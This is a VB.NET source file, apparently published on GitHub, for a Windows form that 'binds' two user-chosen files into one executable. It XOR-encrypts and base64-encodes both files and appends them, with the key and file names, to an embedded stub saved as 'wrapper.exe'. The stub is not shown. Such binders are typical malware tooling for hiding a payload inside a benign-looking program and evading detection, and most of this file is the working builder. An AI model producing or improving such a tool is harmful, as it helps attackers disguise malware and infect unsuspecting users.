﻿Imports System.Text, System.IO

Public Class frmBuild
    Private _F1, _F2, _key As String
    Private Sub frmBuild_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub btnClose_Click(sender As Object, e As EventArgs) Handles btnClose.Click
        Me.Close()
    End Sub

    Private Sub btnMax_Click(sender As Object, e As EventArgs) Handles btnMax.Click
        Me.Location = New Point(Screen.PrimaryScreen.WorkingArea.Right - Me.Width, Screen.PrimaryScreen.WorkingArea.Bottom - Me.Height)
    End Sub

    Private Sub btnMin_Click(sender As Object, e As EventArgs) Handles btnMin.Click
        Me.WindowState = WindowState.Minimized
    End Sub

    Private Sub btnP_Click(sender As Object, e As EventArgs) Handles btnP.Click
        Dim _ofd As New OpenFileDialog

        _ofd.Filter = "All Files (*.*)|*.*"
        _ofd.InitialDirectory = Environment.SpecialFolder.Desktop

        If _ofd.ShowDialog = DialogResult.OK Then

            txtPrimary.Text = _ofd.FileName

            _F1 = Path.GetFileName(_ofd.FileName)

        End If
    End Sub

    Private Sub btnS_Click(sender As Object, e As EventArgs) Handles btnS.Click
        Dim _ofd As New OpenFileDialog

        _ofd.Filter = "All Files (*.*)|*.*"
        _ofd.InitialDirectory = Environment.SpecialFolder.Desktop

        If _ofd.ShowDialog = DialogResult.OK Then

            txtSecondary.Text = _ofd.FileName

            _F2 = Path.GetFileName(_ofd.FileName)

        End If
    End Sub

    Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
        If (String.IsNullOrEmpty(txtPrimary.Text) Or String.IsNullOrEmpty(txtSecondary.Text)) Then
            MessageBox.Show("You must select two files in order to bind!", "Alert!")
        Else

            Dim _sfd As New SaveFileDialog

            _sfd.Filter = "Executable Files (*.exe)|*.exe"
            _sfd.InitialDirectory = Environment.SpecialFolder.Desktop
            _sfd.FileName = "wrapper"

            If _sfd.ShowDialog = DialogResult.OK Then
                Try
                    'generate XOR key
                    _key = get_key(10, 15)

                    Dim fs As String = "|FS|"
                    Dim buffer As Byte() = My.Resources.stub

                    'write stub content to disk
                    My.Computer.FileSystem.WriteAllBytes(_sfd.FileName, buffer, False)

                    'package content of both files
                    Dim File1 As String = _encrypt(txtPrimary.Text)
                    Dim File2 As String = _encrypt(txtSecondary.Text)

                    File.AppendAllText(_sfd.FileName, fs & _key & fs & File1 & fs & File2 & fs & _F1 & fs & _F2)

                    MessageBox.Show("Operation complete!", "")
                Catch ex As Exception
                    MessageBox.Show(ex.Message, "Alert!")
                End Try
            End If
        End If
    End Sub

    Private Sub lnkClick_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles lnkClick.LinkClicked
        Process.Start("https://github.com/waived")
    End Sub

    Private Function _encrypt(_path As String) As String
        'read file bytes
        Dim fileBytes As Byte() = File.ReadAllBytes(_path)

        'convert key to bytes
        Dim passwordBytes As Byte() = Encoding.UTF8.GetBytes(_key)

        'array to store xor encrypted bytes
        Dim encryptedBytes As Byte() = New Byte(fileBytes.Length - 1) {}

        'perform xor encryption
        For i As Integer = 0 To fileBytes.Length - 1
            encryptedBytes(i) = fileBytes(i) Xor passwordBytes(i Mod passwordBytes.Length)
        Next

        'wrap bytes in base64
        Dim base64String As String = Convert.ToBase64String(encryptedBytes)

        Return base64String
    End Function

    Public Function get_key(MinLength As Integer, MaxLength As Integer) As String
        'Static rnd As New Random()
        Dim rnd As New Random()
        Dim validchars() As Char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ0123456789".ToCharArray()
        Dim res As String = ""
        For i As Integer = 0 To rnd.Next(MinLength - 1, MaxLength)
            res += validchars(rnd.Next(0, validchars.Length))
        Next
        Return res
    End Function
End Class
